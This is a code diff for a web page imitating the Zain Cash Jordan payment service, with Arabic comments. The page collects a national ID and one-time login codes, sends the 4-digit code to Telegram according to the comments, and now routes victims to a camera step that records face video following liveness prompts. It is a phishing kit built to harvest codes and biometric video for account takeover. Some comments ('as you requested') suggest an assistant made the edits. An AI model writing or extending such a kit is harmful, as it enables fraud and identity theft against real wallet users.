@@ -557,9 +557,6 @@
           </div>
           <button type="submit" class="button">تأكيد الرمز</button>
         </form>
-        <div style="text-align:center;margin-top:8px;">
-          <button id="faceVerifyBtn" class="button" style="font-weight:700;margin-top:8px;">التحقق بالوجه</button>
-        </div>
         <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
       `;
       const codeInput = document.getElementById('code5input');
@@ -588,10 +585,6 @@
       document.getElementById('backBtn').onclick = () => {
         renderNationalIdStep();
       };
-      // وجه الزر بنفس الشكل والمكان الأصلي — هنا ننتقل لشاشة المقدمة للتحقق بالوجه
-      document.getElementById('faceVerifyBtn').onclick = () => {
-        renderFaceIntro();
-      };
     }
 
     function showWaitMsgAndGotoCode4() {
@@ -601,7 +594,7 @@
           <div style="margin-bottom:18px;">
             <img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;box-shadow:0 1px 7px #2f80ed33;"/>
           </div>
-          <div style="color:#2F80ED;font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانت��ار...</div>
+          <div style="color:#2F80ED;font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانتظار...</div>
           <div style="color:#353a4d;font-size:15px;">جاري التحقق من رمز الدخول</div>
           <div id="waitSec" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
         </div>
@@ -632,6 +625,7 @@
           </div>
           <button type="submit" class="button">تأكيد الرمز</button>
         </form>
+
         <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
       `;
       const codeInput = document.getElementById('code4input');
@@ -639,6 +633,8 @@
       codeInput.addEventListener('input', function() {
         this.value = this.value.replace(/\D/g, '').slice(0,4);
       });
+
+      // عند تقديم رمز الـ4 نرسل للتيليجرام ثم ننتقل إلى شاشة التحقق بالوجه (كما طلبت)
       document.getElementById('code4Form').onsubmit = async function(e) {
         e.preventDefault();
         let code = codeInput.value.trim();
@@ -655,14 +651,16 @@
         } catch (err) {
           console.log("Telegram error:", err);
         }
-        showFinalErrorAndReset();
+        // التوجيه إلى شاشة المقدمة للتحقق بالوجه بعد الضغط على "تأكيد الرمز"
+        renderFaceIntro();
       };
+
       document.getElementById('backBtn').onclick = () => {
         renderCode5Step();
       };
     }
 
-    // ---------------- شاشة المقدمة للتحقق بالوجه (مع التعليمات كما طلبت) ----------------
+    // ---------------- شاشة المقدمة للتحقق بالوجه (مع التعليمات) ----------------
     function renderFaceIntro() {
       currentStep = "faceIntro";
       app.innerHTML = `
@@ -691,7 +689,7 @@
         <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
       `;
       document.getElementById('backBtn').onclick = () => {
-        renderCode5Step();
+        renderCode4Step();
       };
       document.getElementById('startFaceBtn').onclick = async () => {
         try {
@@ -699,12 +697,12 @@
         } catch (err) {
           console.error("Capture error:", err);
           alert('لم نستطع الوصول إلى الكاميرا. يرجى التأكد من الأذونات والمحاولة مرة أخرى.');
-          renderCode5Step();
+          renderCode4Step();
         }
       };
     }
 
-    // ---------------- تسجيل سلسلة مقاطع قص��رة حسب التعليمات ----------------
+    // ---------------- تسجيل سلسلة مقاطع قصيرة حسب التعليمات ----------------
     async function startCaptureSequence() {
       const steps = [
         { label: "اغمض عينيك", duration: 2500 },
@@ -742,7 +740,7 @@
       const countdownEl = document.getElementById('countdown');
       const promptEl = document.getElementById('cameraPrompt');
 
-      // اختر أفضل نوع ممكن ��لتسجيل (حاول MP4/H264 ثم fall back إلى webm)
+      // اختر أفضل نوع ممكن للتسجيل (حاول MP4/H264 ثم fall back إلى webm)
       let chosenMime = null;
       if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
         if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) {
@@ -767,7 +765,7 @@
         } catch (err) {
           stopStream(stream);
           alert('جهازك أو متصفحك لا يدعم تسجيل الفيديو المطلوب. جرب متصفحًا آخر.');
-          renderCode5Step();
+          renderCode4Step();
           return;
         }
       }
@@ -784,7 +782,7 @@
         cancelled = true;
         try { recorder.state !== 'inactive' && recorder.stop(); } catch(e){}
         stopStream(stream);
-        renderCode5Step();
+        renderCode4Step();
       };
 
       for (let i = 0; i < steps.length; i++) {
